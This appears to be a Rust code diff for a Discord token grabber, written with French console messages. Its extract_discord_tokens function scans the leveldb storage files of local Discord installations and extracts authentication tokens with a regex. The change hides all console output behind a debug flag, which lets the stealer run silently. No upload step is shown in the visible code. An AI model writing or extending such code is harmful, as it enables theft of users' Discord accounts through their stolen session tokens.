@@ -33,13 +33,15 @@ fn path_exists(s: &str) -> bool {
     Path::new(s).exists()
 }
 
-fn search_tokens(file_path: &str, token_regex: &Regex) -> Vec<String> {
+fn search_tokens(file_path: &str, token_regex: &Regex, debug: bool) -> Vec<String> {
     let mut matched_tokens = Vec::new();
 
     let mut big_file = match fs::File::open(file_path) {
         Ok(file) => file,
         Err(_) => {
-            eprintln!("Erreur : Impossible d'ouvrir le fichier.");
+            if debug {
+                eprintln!("Erreur : Impossible d'ouvrir le fichier {}", file_path);
+            }
             return matched_tokens;
         }
     };
@@ -47,8 +49,9 @@ fn search_tokens(file_path: &str, token_regex: &Regex) -> Vec<String> {
     const BUFFER_SIZE: usize = 1024 * 1024;
     let mut buffer = vec![0; BUFFER_SIZE];
     let mut accumulated_data = String::new();
-
-    println!("Recherche de token: \x1B[35m{}\x1B[0m", file_path);
+    if debug {
+        println!("Recherche de token: \x1B[35m{}\x1B[0m", file_path);
+    }
 
     while let Ok(bytes_read) = big_file.read(&mut buffer) {
         if bytes_read == 0 {
@@ -64,9 +67,11 @@ fn search_tokens(file_path: &str, token_regex: &Regex) -> Vec<String> {
     matched_tokens
 }
 
-fn grab_path() -> Vec<String> {
+fn grab_path(debug: bool) -> Vec<String> {
     let system = std::env::consts::OS;
-    println!("OS detecté: \x1B[0;36m{}\x1B[0m", system);
+    if debug {
+        println!("OS detecté: \x1B[0;36m{}\x1B[0m", system);
+    }
 
     let mut target_locations = Vec::new();
 
@@ -138,7 +143,9 @@ fn grab_path() -> Vec<String> {
             target_locations.extend(paths);
         }
         _ => {
-            eprintln!("OS non supporté: {}", system);
+            if debug {
+                eprintln!("OS non supporté: {}", system);
+            }
         }
     }
 
@@ -150,9 +157,9 @@ impl Extractor {
         Extractor {}
     }
 
-    pub fn extract_discord_tokens(&self) -> Vec<String> {
+    pub fn extract_discord_tokens(&self, debug: bool) -> Vec<String> {
         let mut tokens = Vec::new();
-        let mut path = grab_path();
+        let mut path = grab_path(debug);
 
         for path in path.iter_mut() {
             path.push_str("/Local Storage/leveldb");
@@ -167,7 +174,7 @@ impl Extractor {
                         if let Ok(entry) = entry {
                             if let Some(entry_path) = entry.path().to_str() {
                                 if has_ending(entry_path, ".log") || has_ending(entry_path, ".ldb") {
-                                    let stored_tokens = search_tokens(entry_path, &token_regex);
+                                    let stored_tokens = search_tokens(entry_path, &token_regex, debug);
 
                                     tokens.extend(stored_tokens);
                                 }
